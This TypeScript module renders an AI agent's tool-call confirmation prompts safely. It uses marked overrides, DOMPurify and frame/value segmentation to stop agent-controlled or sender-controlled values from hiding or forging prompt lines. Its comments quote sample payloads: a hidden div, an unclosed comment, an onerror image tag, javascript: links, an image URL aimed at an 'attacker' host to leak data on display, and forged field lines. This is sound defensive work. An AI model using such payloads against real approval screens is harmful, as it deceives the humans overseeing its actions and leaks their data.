import { Marked } from 'marked';
import DOMPurify from 'dompurify';

/**
 * Markdown rendering for CONFIRMATION-PROMPT text — the prompts a human answers
 * to authorise a tool call (`http_request` outbound consent, `api_setup`
 * endpoint ack, `knowledge_delete`, `subjects_merge`, `mail_send`/`mail_reply`,
 * `ask_user`).
 *
 * These prompts interpolate values the agent — or, for `mail_reply`, an
 * arbitrary external sender — controls. Rendering them through the normal chat
 * markdown path let such a value SUPPRESS the rest of the prompt: an unclosed
 * `<div hidden>` re-parents every following line into an invisible container,
 * and a `<!--` swallows them into a comment. Either way the text a human clicks
 * "Yes" to was no longer the text on screen.
 *
 * Two layers, in this order and for this reason:
 *
 * 1. Renderer overrides on `html`, `text`, `link` and `image` so the markdown
 *    stage does not EMIT raw HTML in the first place. This is the layer the
 *    tests exercise, so it is the one that has to hold on its own.
 * 2. `DOMPurify.sanitize` behind it. It cannot be exercised by the suite —
 *    it needs a real DOM and FAILS OPEN without one, returning its input
 *    unchanged and silently — so it is not something to rest a security
 *    property on. It stays anyway, because "cannot be relied upon" is not
 *    "worthless": it is what catches a marked upgrade that starts emitting
 *    something these overrides don't anticipate. It is not free, though — on
 *    such a tag it DELETES, in the browser only, and losing content is this
 *    module's own threat. That is why the tag lists below are pinned in both
 *    directions instead of trusted.
 *
 * The `text` override in layer 1 is not decoration. marked marks text tokens
 * `escaped: true` while its lexer is `inRawBlock`, which a leading `<code>`,
 * `<kbd>`, `<pre>` or `<script>` in an interpolated value is enough to set —
 * and the default `text` renderer returns escaped tokens VERBATIM. Without the
 * override, `<code><img/src=x onerror=…>` in a mail subject reached the DOM as
 * a live element.
 *
 * Scope, stated honestly: this closes SUPPRESSION. It does not stop a value
 * from adding a plausible-looking FAKE line of its own — that needs the prompt
 * payload to separate system frame from interpolated value, which is a
 * different change (see DEF-confirm-prompt-value-spoofing).
 */

/** Schemes a link inside a prompt may point at. */
const SAFE_LINK_SCHEMES: ReadonlySet<string> = new Set(['http:', 'https:', 'mailto:']);

const ESCAPE_CHARS: Readonly<Record<string, string>> = {
	'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
};

/**
 * Mirrors marked's own `escapeReplaceNoEncode`: angle brackets and quotes always,
 * but `&` only when it does NOT already begin an entity.
 *
 * Escaping every `&` unconditionally is wrong and user-visible — `Tom &amp; Jerry`
 * in a subject came out as a literal `&amp;` on screen, and `a&nbsp;b` lost its
 * non-breaking space. Leaving existing entities alone is safe: the HTML parser
 * resolves `&lt;` to a character AFTER tokenising, so an entity can never become
 * a tag.
 */
function escapeHtml(value: string): string {
	return value.replace(
		/[<>"']|&(?!(?:#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g,
		(char) => ESCAPE_CHARS[char] ?? char,
	);
}

/**
 * A link target is safe only as an ABSOLUTE url on an allowlisted scheme.
 * `javascript:`, `data:` and `vbscript:` all survive marked untouched (verified
 * against marked 18), and scheme matching has to be case-insensitive —
 * `JaVaScRiPt:` parses just fine. Relative hrefs are refused rather than
 * resolved: a prompt has no meaningful relative target, so anything relative is
 * more likely an attempt to look like a link than a real one.
 */
export function isSafePromptHref(href: string): boolean {
	try {
		// The URL parser lowercases the scheme, so this comparison is
		// case-insensitive without a manual toLowerCase().
		return SAFE_LINK_SCHEMES.has(new URL(href).protocol);
	} catch {
		return false;
	}
}

/**
 * A marked instance private to prompt rendering.
 *
 * It must be its OWN instance: `marked.use()` mutates the shared singleton, so
 * configuring the global would silently re-configure every chat message too.
 *
 * `breaks: true` gives each field its own line: the prompts separate fields with
 * single newlines (`**To:** …\n**Subject:** …`), which marked's default collapses
 * into one run-on paragraph. A reader who cannot tell the fields apart checks
 * nothing, so this matters for a prompt that carries a security decision.
 *
 * Its effect on FORGERY is not uniform, and the difference is worth knowing
 * before reusing this reasoning:
 *   - Where the caller forces values through `singleLine()` (the mail previews),
 *     a value cannot contain a newline, so it cannot open a line of its own —
 *     strictly better than the collapsed paragraph.
 *   - Where it does not (`http_request` host/path, `api_setup`, `ask_user`), a
 *     value carrying `\n**Host:** …` now renders that on its own row, which
 *     looks exactly like a real field. Under the collapsed paragraph the same
 *     payload landed mid-sentence, where a second `Host:` reads as odd. So this
 *     makes an already-possible forgery more plausible; it does not create it.
 * Closing that asymmetry needs the payload to mark which spans are values —
 * see DEF-confirm-prompt-value-spoofing. It is deliberately NOT patched by
 * escaping newlines here: this layer receives one finished string and cannot
 * tell a frame newline from a value newline.
 */
const promptMarked = new Marked({
	gfm: true,
	breaks: true,
	tokenizer: {
		/**
		 * A link-reference definition produces no output at all, so a multi-line
		 * one (`[a]: https://e "` … `"`) SWALLOWS every line caught inside its
		 * title — measured: body quote and size warning both gone. Returning
		 * undefined declines the token so the text falls through to a paragraph
		 * and stays on screen. Reference-style links are of no use in a prompt.
		 */
		def() {
			return undefined;
		},
	},
	renderer: {
		/**
		 * `<div hidden>` and `<!--` become characters on screen instead of
		 * structure. Block and inline HTML both arrive here.
		 */
		html(token) {
			return escapeHtml(token.text);
		},

		/**
		 * marked flags text tokens `escaped: true` while its lexer is
		 * `inRawBlock` — a leading `<code>`/`<kbd>`/`<pre>`/`<script>` in an
		 * interpolated value sets it — and the DEFAULT text renderer returns
		 * those verbatim. That reopened everything the `html` override closes,
		 * up to and including a live `<img/src=x onerror=…>`. Container tokens
		 * still recurse so inline emphasis inside a paragraph keeps working.
		 */
		text(token) {
			return 'tokens' in token && token.tokens && token.tokens.length > 0
				? this.parser.parseInline(token.tokens)
				: escapeHtml(token.text);
		},

		/**
		 * Unsafe targets degrade to their visible text rather than vanishing.
		 * Dropping the text instead would hand an attacker the very thing this
		 * module exists to prevent — a way to make prompt content disappear.
		 */
		link(token) {
			const text = this.parser.parseInline(token.tokens);
			if (!isSafePromptHref(token.href)) return text;
			const title = token.title ? ` title="${escapeHtml(token.title)}"` : '';
			return `<a href="${escapeHtml(token.href)}"${title} rel="noreferrer noopener" target="_blank">${text}</a>`;
		},

		/**
		 * No `<img>` in a prompt, ever. marked emits a real `<img src=…>`, so
		 * `![](https://attacker/?d=…)` in an attacker-controlled subject would
		 * fire an outbound request the moment the confirmation is DISPLAYED —
		 * a tracking/exfil channel that needs no click at all. The alt text is
		 * kept so nothing silently disappears.
		 */
		image(token) {
			const alt = token.text.trim();
			return escapeHtml(alt.length > 0 ? `[image: ${alt}]` : '[image]');
		},
	},
});

/**
 * What layer 2 permits. Pinned to this list rather than DOMPurify's defaults,
 * which allow `div`, `style` and `hidden` and keep comments — exactly the
 * suppression primitives.
 *
 * This is a CEILING, not an inventory of what marked emits: `input` is emitted
 * for task lists and deliberately absent (see `PROMPT_STRIPPED_TAGS`). The tests
 * assert both directions — but only over the markdown constructs the rich-prompt
 * case exercises. A marked upgrade that emits something new for a construct not
 * in that list would still slip through and be deleted in the browser, so extend
 * the case rather than assuming the assertion is exhaustive.
 */
export const PROMPT_EMITTED_TAGS: readonly string[] = [
	'p', 'br', 'strong', 'em', 'del', 'code', 'pre', 'blockquote',
	'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'a', 'hr',
	'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

/**
 * Tags marked emits that layer 2 removes on purpose. Listed explicitly because
 * the difference between "deliberately stripped" and "overlooked" is invisible
 * once it only happens in a browser.
 *
 * `input` comes from GFM task lists (`- [ ] x`). A prompt has no business
 * carrying an input element, and the tag is void — removing it costs the
 * checkbox and nothing else, the item's text is untouched.
 */
export const PROMPT_STRIPPED_TAGS: readonly string[] = ['input'];

/**
 * Attributes layer 2 keeps. `start` is here for a content reason, not a cosmetic
 * one: marked renders `3. third` as `<ol start="3">`, and dropping the attribute
 * silently renumbers the list to 1, 2 — the prompt would then display different
 * values than the text it was built from. `class` (code fences) and `align`
 * (table cells) are dropped; both are purely presentational here, since this
 * path has no syntax highlighter.
 */
export const PROMPT_ALLOWED_ATTR: readonly string[] = ['href', 'title', 'rel', 'target', 'start'];

/**
 * Shown when a prompt arrives without text. Not localised on purpose: it marks a
 * broken payload, never normal operation, and an untranslated warning beats the
 * alternative below.
 */
const MISSING_PROMPT_TEXT = '⚠ <strong>Prompt text unavailable.</strong> Deny unless you know what this is.';

/**
 * Render confirmation-prompt markdown to HTML for injection.
 *
 * Layer 1 (marked overrides above) is what the suite verifies and what has to
 * hold. Layer 2 (DOMPurify) runs only where a DOM exists; without one it returns
 * its input unchanged, which is why nothing here depends on it.
 */
export function renderPromptMarkdown(text: string): string {
	// Returning nothing would leave the approver with bare Yes/No buttons and no
	// text at all — the same blank prompt this module exists to prevent, just
	// arriving through a broken payload instead of an attack. Say so instead.
	const html = typeof text !== 'string' || text.length === 0
		? `<p>${MISSING_PROMPT_TEXT}</p>`
		: (promptMarked.parse(text, { async: false }) as string);
	// The fallback is a local literal and needs no sanitising, but routing it
	// through anyway keeps ONE invariant instead of two: everything this function
	// returns has passed layer 2. An exempt path is how the next edit to that
	// string stops being reviewed as output.
	return sanitizePromptHtml(html);
}

/**
 * Layer 2. Outside a browser — the test runner, SSR — DOMPurify's default export
 * is an uninitialised factory with no `sanitize` at all, so this hands the
 * markdown stage's output straight back. That absence is not worked around on
 * purpose: pretending layer 2 is present where it cannot run is how a fail-open
 * guard gets mistaken for a real one.
 *
 * Its own failure mode is worth naming rather than assuming it is free upside:
 * anything outside the lists above is DELETED, in the browser only, where no CI
 * run can see it. On an unanticipated tag that is content loss — the very thing
 * layer 1 is built to prevent. Hence the tests pin both what may appear and what
 * is knowingly stripped, so the set never drifts unobserved.
 */
function sanitizePromptHtml(html: string): string {
	if (typeof DOMPurify.sanitize !== 'function') return html;
	return DOMPurify.sanitize(html, {
		ALLOWED_TAGS: [...PROMPT_EMITTED_TAGS],
		ALLOWED_ATTR: [...PROMPT_ALLOWED_ATTR],
		ALLOW_DATA_ATTR: false,
	});
}

// --- Segmented prompts: values render as TEXT, never as markdown ---

/**
 * One span of a prompt as the engine sends it (engine v51).
 *
 * The shape is duplicated rather than imported: this package has no dependency
 * on the engine, and this is a wire payload, so a local declaration is what the
 * boundary actually is. `stores/chat.svelte.ts` validates it on arrival.
 */
export interface RenderablePromptSegment {
	kind: 'frame' | 'value';
	text: string;
}

/**
 * The placeholder values are swapped out for. It must survive BOTH stages of
 * `renderPromptMarkdown`, and the second one is the trap:
 *
 * NUL was the original choice, and it is correct about layer 1 — `marked` does
 * pass it through. But layer 2 parses through the browser's HTML parser, and
 * that parser DELETES U+0000 outright (measured in Chrome 150: `innerHTML`,
 * `DOMParser` and `<template>` all drop it, without even leaving U+FFFD). Every
 * slot therefore vanished before the split below, `split` found one part, and
 * EVERY interpolated value was silently dropped — "Delete event ? This cannot be
 * undone." with the id gone, in the browser only.
 *
 * Nothing could see it: layer 2 is a no-op without a DOM, so the whole suite is
 * blind to it by construction, and `linkedom` — the DOM the package does have —
 * preserves NUL, so even a DOM-mode test would have passed.
 *
 * U+E000 is a Private Use Area code point: permanently unassigned by Unicode, no
 * meaning in markdown, and verified to survive `marked` and all three browser
 * parse paths. It keeps NUL's actual load-bearing property — it is REMOVED from
 * every value first, so a value cannot carry one however it was crafted.
 *
 * The choice is still an assumption about someone else's parser, so it is no
 * longer the only thing standing between a value and silence: the reconciliation
 * below checks that every slot came back and fails LOUDLY if one did not.
 */
export const VALUE_SLOT = '\uE000';

/**
 * Render a prompt whose frame and values are separated.
 *
 * Why one pass over placeholders instead of rendering each segment on its own:
 * block structure crosses segment boundaries. `plan_task` puts the `> ` in a
 * frame and the quoted text in the value; `**Host:** ` is a frame whose value
 * belongs on the same line. Rendering segments individually would produce an
 * empty blockquote next to an unquoted value — correct-looking markup that says
 * something false.
 *
 * So: frames keep their markdown, each value becomes a placeholder, the whole
 * thing goes through the same hardened chain as any other prompt, and the
 * placeholders are then replaced with HTML-ESCAPED text. Escaped text can only
 * ever become a text node, so a value cannot open a construct, forge a line, or
 * introduce an element — regardless of how many lines it has. This is what the
 * per-caller `singleLine`/quoting could only approximate.
 *
 * The one assumption, stated because it is not enforced here: a frame must not
 * place a value in ATTRIBUTE position (`<a href="${value}">`). No frame does —
 * and the link override already rejects a non-allowlisted target — but a future
 * frame that did would put escaped text somewhere escaping is not sufficient.
 */
export function renderPromptSegments(segments: readonly RenderablePromptSegment[]): string {
	if (segments.length === 0) return renderPromptMarkdown('');

	const values: string[] = [];
	const withSlots = segments
		.map((segment) => {
			if (segment.kind === 'frame') return segment.text;
			values.push(segment.text.split(VALUE_SLOT).join(''));
			return VALUE_SLOT;
		})
		.join('');

	const html = renderPromptMarkdown(withSlots);

	// Reconcile before substituting. `VALUE_SLOT` is a bet on what two parsers we
	// do not own leave alone, and when that bet lost, the failure was SILENT: the
	// slots were gone, `split` returned one part, and the loop below emitted the
	// frame with every value missing — a confirmation prompt asking about nothing.
	// A wrong count means the chain ate a slot, so refuse to guess which values
	// belong where and fall back to a rendering that cannot lose one.
	const parts = html.split(VALUE_SLOT);
	if (parts.length - 1 !== values.length) return plainTextPrompt(segments);

	// A value may show its own line breaks only when it IS the whole prompt.
	// See `escapeValueText`.
	const lone = segments.length === 1 && segments[0]?.kind === 'value';

	let index = 0;
	return parts.reduce((acc, part, i) => {
		if (i === 0) return part;
		const value = values[index++] ?? '';
		return acc + escapeValueText(value, lone) + part;
	}, '');
}

/**
 * A value is text. Whether its line breaks are allowed to SHOW depends on what
 * surrounds it, and the distinction is the whole of this function.
 *
 * **Alone** — the prompt is one value and nothing else — the text is prose the
 * agent wrote, and its newlines are part of it. Escaping alone left them raw
 * inside the `<p>`, where CSS collapses them, so `ask_user`'s three-line
 * question rendered as one run-on line. That is invisible in the markup (the
 * newline IS there) and only shows on the rendered page.
 *
 * **Inside a frame** they stay collapsed, and that is not a limitation — it is
 * the guard. A frame with field structure (`google-calendar.ts` writes a
 * literal `\nTime: `) is exactly what a value's newline can imitate: measured,
 * `summary = 'Coffee\nTime: 09:00'` renders its forged `Time:` row on its own
 * line, indistinguishable from the real one below. Collapsing was what made
 * that impossible, and `prompt-value.ts` documents the attack it prevents.
 * The same rule also keeps a value verbatim when a frame opened a code fence.
 *
 * So the test is structural, not per-caller: nobody has to remember to clip a
 * field, and nobody has to remember to allow prose. The `<br>` is emitted by US
 * after escaping either way, so it grants the value nothing — it cannot open a
 * construct, close one, or introduce an element.
 */
function escapeValueText(value: string, lone: boolean): string {
	const escaped = escapeHtml(value);
	return lone ? escaped.split('\n').join('<br>') : escaped;
}

/**
 * The degraded rendering: no markdown is parsed at all, so nothing a value
 * carries can become markup.
 *
 * It must still keep the frame/value DISTINCTION, which is the whole point of
 * the module. A first version escaped everything into one flat `<pre>`, and that
 * was a quiet own-goal: with no markup left, the system's `**Host:** ` renders
 * with its asterisks showing, exactly like a value that forged `**Host:**
 * api.stripe.com` — so the forged label reads MORE like a label than the real
 * one. And because this path fires for every prompt at once when a parser eats
 * the slot, that would disable the release's anti-spoofing property fleet-wide
 * rather than in one prompt. So values go in `<code>`: still text nodes, still
 * incapable of opening a construct, but visibly not frame.
 *
 * The slot is stripped here too. `plainTextPrompt` receives the ORIGINAL
 * segments, not the cleaned values from the caller, so without this a value
 * carrying U+E000 — an attacker-controlled mail subject, say — would emit a raw
 * private-use code point into the DOM.
 */
function plainTextPrompt(segments: readonly RenderablePromptSegment[]): string {
	const body = segments
		.map((s) => {
			const text = escapeHtml(s.text.split(VALUE_SLOT).join(''));
			return s.kind === 'value' ? `<code>${text}</code>` : text;
		})
		.join('');
	return sanitizePromptHtml(`<pre>${body}</pre>`);
}
